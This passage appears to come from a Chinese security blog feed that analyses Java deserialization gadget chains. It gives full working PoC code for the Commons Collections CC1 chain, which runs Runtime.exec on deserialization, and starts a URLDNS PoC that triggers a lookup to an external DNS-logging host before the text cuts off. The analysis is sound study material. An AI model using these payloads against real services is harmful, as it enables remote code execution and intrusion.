class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) getRuntimeMethod.invoke(<span class="literal">null</span>,<span class="literal">null</span>);</span><br><span class="line"><span class="type">Method</span> <span class="variable">execMethod</span> <span class="operator">=</span> c.getMethod(<span class="string">&quot;exec&quot;</span>,String.class);</span><br><span class="line">execMethod.invoke(r,<span class="string">&quot;calc&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改成 InvokerTransformer 调用形式</span></span><br><span class="line"><span class="type">Method</span> <span class="variable">getRuntimeMethod</span> <span class="operator">=</span> (Method) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>, <span class="literal">null</span>&#125;).transform(Runtime.class);</span><br><span class="line"></span><br><span class="line"><span class="type">Runtime</span> <span class="variable">r</span> <span class="operator">=</span> (Runtime) <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;).transform(getRuntimeMethod);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 执行测试</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;).transform(r);</span><br></pre></td></tr></table></figure><h4 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h4><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231113234038569.png" alt="image-20231113234038569"></p><p>该类维护了一个Transformer接口类型的数组iTransformers，<code>transform()</code> 先将输入的对象交给iTransformers数组第一个转换器的 <code>transform()</code> 进行修饰，修饰后的结果又作为下一个转化器的要修饰的对象（链式转化器）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_Serial</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ChainedTransformer链式执行</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;aaa&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Override.class,transformedMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>断点走一下 <code>readObject()</code> 的 if 判断</p><p>前三行循环获取键值对获取</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114171157770.png" alt="image-20231114171157770"></p><p>总览</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114172318807.png" alt="image-20231114172318807"></p><p><code>annotationType = AnnotationType.getInstance(type);</code> 获取 type 成员方法，没有会新建一个AnnotationType</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114172915205.png" alt="image-20231114172915205"></p><p>AnnotationInvocationHandler 构造方法内可以给 type 赋值</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114172416803.png" alt="image-20231114172416803"></p><p>上面代码，赋值的是 Override，Java的注释类，而 Override 没有参数</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114173211138.png" alt="image-20231114173211138"></p><p>换成 Target，然后 map 的 put，进入的键值对的 key 要改成 Target 参数的名，且值不为 null</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114173329370.png" alt="image-20231114173329370"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);</span><br></pre></td></tr></table></figure><p>继续调试，可以执行 <code>setValue()</code>，继续跟进，发现 <code>checkSetValue(value)</code> 中 value 的值不是构想的Runtime</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114174205086.png" alt="image-20231114174205086"></p><p>第二个 if 判断是否对象可以强转，最后的 <code>setValue(value)</code> 的 value 是 new 的 AnnotationTypeMismatchExceptionProxy，固定了，改不了</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114173932154.png" alt="image-20231114173932154"></p><h4 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h4><p>这里的 transform 无论接受什么，返回值不会改变，都是 iConstant</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023/image-20231114181215574.png" alt="image-20231114181215574"></p><h3 id="Gadget-chain"><a href="#Gadget-chain" class="headerlink" title="Gadget chain"></a>Gadget chain</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Gadget chain：</span></span><br><span class="line"><span class="comment">    objectInputStream.readobject()</span></span><br><span class="line"><span class="comment">        AnnotationInvocationHandler.readobject()</span></span><br><span class="line"><span class="comment">            TransformedMap.entrySet()</span></span><br><span class="line"><span class="comment">            AbstractInputCheckedMapDecorator$MapEntry.setValue()</span></span><br><span class="line"><span class="comment">                (TransformedMap继承AbstractInputCheckedMapDecorator)</span></span><br><span class="line"><span class="comment">                    TransformedMap.checkSetvalue()</span></span><br><span class="line"><span class="comment">                        ChainedTransformner.transform()</span></span><br><span class="line"><span class="comment">                            ConstantTransformer.transform()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Class.getMethod()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.getRuntime()</span></span><br><span class="line"><span class="comment">                            InvokerTransformer.transform()</span></span><br><span class="line"><span class="comment">                                Method.invoke()</span></span><br><span class="line"><span class="comment">                                    Runtime.exec()</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> Gadget.CC1;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC1_Transformer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">// ChainedTransformer链式执行</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[] &#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"><span class="comment">//        chainedTransformer.transform(Runtime.class);  // test</span></span><br><span class="line"></span><br><span class="line">        HashMap&lt;Object,Object&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        map.put(<span class="string">&quot;value&quot;</span>,<span class="string">&quot;abc&quot;</span>);  <span class="comment">// 添加键值对</span></span><br><span class="line">        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(map,<span class="literal">null</span>,chainedTransformer);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// AnnotationInvocationHandler类是default，不能直接获取</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span>  <span class="variable">annotationInvocationHandlerConstructor</span> <span class="operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);</span><br><span class="line">        annotationInvocationHandlerConstructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> annotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">bos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(bos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化</span></span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bos.toByteArray());</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bis);</span><br><span class="line">        ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Deserialize </tag>
            
            <tag> CommonsCollections </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>URLDNS</title>
      <link href="/2023/11/11/java/base/URLDNS/"/>
      <url>/2023/11/11/java/base/URLDNS/</url>
      
        <content type="html"><![CDATA[<h2 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h2><p>触发反序列化的方法是readObject，直奔 HashMap 类的 readObject ⽅法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">    <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line"></span><br><span class="line">    ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">    <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">    <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">    lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">    HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">    reinitialize();</span><br><span class="line"></span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// use defaults</span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">        <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后一段for循环</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113120658086.png" alt="image-20231113120658086"></p><p>注释：读取键和值，并将映射放在HashMap中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure><p>这里计算了键名的hash值，跟进</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113121133713.png" alt="image-20231113121133713"></p><p>键值不为空，会调用 hashCode，hashCode 初始值为 -1，跟进</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113165118461.png" alt="image-20231113165118461"></p><p>handler 是 URLStreamHandler 对象，继续跟进</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113170008212.png" alt="image-20231113170008212"></p><p>后面的不重要了</p><p>这⾥有调⽤ getHostAddress ⽅法，继续跟进：</p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113170237558.png" alt="image-20231113170237558"></p><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113170200390.png" alt="image-20231113170200390"></p><p>这⾥ InetAddress.getByName(host) 的作⽤是根据主机名，获取其IP地址，在⽹络上其实就是⼀次DNS查询</p><h3 id="Poc"><a href="#Poc" class="headerlink" title="Poc"></a>Poc</h3><blockquote><p>沃克：</p><p>在put时，就会产生DNS请求，经过DNS请求之后，url对象的hashCode值就被重新计算，不是初始值-1了，那么接下来序列化时不是-1，反序列化出来自然也不是-1，故实际反序列化时也就不会进行DNS请求，而在我们的DNS平台上收到的请求实际上是put时发出的，会对我们判断目标是否存在反序列化漏洞形成干扰</p><p>故此坑的解决方法是：利用反射，在put之前将url对象的hashCode值设值成不为-1,put之后再利用反射，将其设置为-1，这样put时就不会发起DNS请求了</p></blockquote><p><img src="https://raw.githubusercontent.com/n2ryx/images/main/2023//image-20231113182238917.png" alt="image-20231113182238917"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    Gadget chain:</span></span><br><span class="line"><span class="comment">        HashMap.readObject()</span></span><br><span class="line"><span class="comment">            HashMap.hash()</span></span><br><span class="line"><span class="comment">                URL.hashCode()</span></span><br><span class="line"><span class="comment">                    URLStreamHandler.hashCode()</span></span><br><span class="line"><span class="comment">                        URLStreamHandler.getHostAddress()</span></span><br><span class="line"><span class="comment">                            ...</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://uedwpuvfgr.dgrh3.cn&quot;</span>);</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 